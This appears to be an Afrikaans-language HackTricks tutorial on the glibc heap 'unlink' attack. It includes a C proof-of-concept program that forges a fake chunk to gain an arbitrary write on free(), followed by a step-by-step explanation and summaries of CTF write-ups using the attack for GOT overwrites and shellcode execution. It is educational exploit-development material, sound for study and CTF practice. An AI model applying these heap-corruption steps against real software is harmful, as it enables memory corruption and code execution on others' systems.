# Unlink Aanval

{{#include ../../banners/hacktricks-training.md}}

## Basiese Inligting

Toe hierdie aanval ontdek is, het dit meestal 'n WWW (Write What Where) toegelaat, maar sommige **kontroles is bygevoeg** wat die nuwe weergawe van die aanval meer interessant, meer kompleks en **onbruikbaar** gemaak het.

### Kode Voorbeeld:

<details>

<summary>Kode</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

- Die aanval werk nie as tcaches gebruik word nie (na 2.26)

### Doel

Hierdie aanval maak dit moontlik om **'n wysiger na 'n stuk te verander om 3 adresse voor homself aan te dui**. As hierdie nuwe ligging (omgewing van waar die wysiger geleë was) interessante goed het, soos ander beheerde toewysings / stapel..., is dit moontlik om dit te lees/oor te skryf om groter skade te veroorsaak.

- As hierdie wysiger in die stapel geleë was, omdat dit nou na 3 adresse voor homself wys en die gebruiker dit potensieel kan lees en verander, sal dit moontlik wees om sensitiewe inligting van die stapel te lek of selfs die terugwysiger (miskien) te verander sonder om die kanarie te raak.
- In CTF voorbeelde is hierdie wysiger geleë in 'n reeks wysigers na ander toewysings, daarom, deur dit 3 adresse voor te laat wys en in staat te wees om dit te lees en te skryf, is dit moontlik om die ander wysigers na ander adresse te laat wys.\
Aangesien die gebruiker ook die ander toewysings kan lees/skryf, kan hy inligting lek of nuwe adresse in arbitrêre plekke oorskryf (soos in die GOT).

### Vereistes

- Sommige beheer in 'n geheue (bv. stapel) om 'n paar stukke te skep wat waardes aan sommige van die eienskappe gee.
- Stapellek om die wysigers van die valse stuk in te stel.

### Aanval

- Daar is 'n paar stukke (stuk1 en stuk2)
- Die aanvaller beheer die inhoud van stuk1 en die koppe van stuk2.
- In stuk1 skep die aanvaller die struktuur van 'n valse stuk:
- Om beskermings te omseil, maak hy seker dat die veld `size` korrek is om die fout te vermy: `corrupted size vs. prev_size while consolidating`
- en die velde `fd` en `bk` van die valse stuk wys na waar die stuk1 wysiger in die geheue gestoor is met offsets van -3 en -2 onderskeidelik, sodat `fake_chunk->fd->bk` en `fake_chunk->bk->fd` na 'n posisie in geheue (stapel) wys waar die werklike stuk1 adres geleë is:

<figure><img src="../../images/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

- Die koppe van die stuk2 word gewysig om aan te dui dat die vorige stuk nie gebruik word nie en dat die grootte die grootte van die valse stuk bevat.
- Wanneer die tweede stuk vrygestel word, word hierdie valse stuk ontkoppel:
- `fake_chunk->fd->bk` = `fake_chunk->bk`
- `fake_chunk->bk->fd` = `fake_chunk->fd`
- Voorheen is dit gemaak dat `fake_chunk->fd->bk` en `fake_chunk->bk->fd` na dieselfde plek wys (die ligging in die stapel waar `stuk1` gestoor was, so dit was 'n geldige gekoppelde lys). Aangesien **albei na dieselfde ligging wys**, sal slegs die laaste een (`fake_chunk->bk->fd = fake_chunk->fd`) **effek** hê.
- Dit sal **die wysiger na stuk1 in die stapel oorskryf na die adres (of bytes) wat 3 adresse voor in die stapel gestoor is**.
- Daarom, as 'n aanvaller die inhoud van die stuk1 weer kan beheer, sal hy in staat wees om **binne die stapel te skryf** en potensieel die terugwysiger te oorskryf terwyl hy die kanarie omseil en die waardes en punte van plaaslike veranderlikes te verander. Selfs weer die adres van stuk1 wat in die stapel gestoor is, na 'n ander ligging te verander waar, as die aanvaller weer die inhoud van stuk1 kan beheer, hy oral kan skryf.
- Let daarop dat dit moontlik was omdat die **adresse in die stapel gestoor is**. Die risiko en uitbuiting mag afhang van **waar die adresse na die valse stuk gestoor word**.

<figure><img src="../../images/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Verwysings

- [https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit)
- Alhoewel dit vreemd sou wees om 'n unlink aanval selfs in 'n CTF te vind, hier is 'n paar skrywe waar hierdie aanval gebruik is:
- CTF voorbeeld: [https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14_stkof/index.html)
- In hierdie voorbeeld, in plaas van die stapel, is daar 'n reeks van malloc'ed adresse. Die unlink aanval word uitgevoer om 'n stuk hier te kan toewys, en dus in staat te wees om die wysigers van die reeks malloc'ed adresse te beheer. Dan is daar 'n ander funksionaliteit wat toelaat om die inhoud van stukke in hierdie adresse te verander, wat toelaat om adresse na die GOT te wys, funksie adresse te verander om lekke te kry en RCE.
- Nog 'n CTF voorbeeld: [https://guyinatuxedo.github.io/30-unlink/zctf16_note2/index.html](https://guyinatuxedo.github.io/30-unlink/zctf16_note2/index.html)
- Net soos in die vorige voorbeeld, is daar 'n reeks adresse van toewysings. Dit is moontlik om 'n unlink aanval uit te voer om die adres na die eerste toewysing 'n paar posisies voor die begin van die reeks te laat wys en hierdie toewysing in die nuwe posisie te oorskryf. Daarom is dit moontlik om wysigers van ander toewysings te oorskryf om na die GOT van atoi te wys, dit uit te druk om 'n libc lek te kry, en dan atoi GOT met die adres na 'n een gadget te oorskryf.
- CTF voorbeeld met aangepaste malloc en vry funksies wat 'n kwesbaarheid baie soortgelyk aan die unlink aanval misbruik: [https://guyinatuxedo.github.io/33-custom_misc_heap/csaw17_minesweeper/index.html](https://guyinatuxedo.github.io/33-custom_misc_heap/csaw17_minesweeper/index.html)
- Daar is 'n oorgang wat toelaat om die FD en BK wysigers van aangepaste malloc te beheer wat (aangepas) vrygestel sal word. Boonop het die heap die exec bit, so dit is moontlik om 'n heap adres te lek en 'n funksie van die GOT na 'n heap stuk met 'n shellcode aan te dui om uit te voer.

{{#include ../../banners/hacktricks-training.md}}
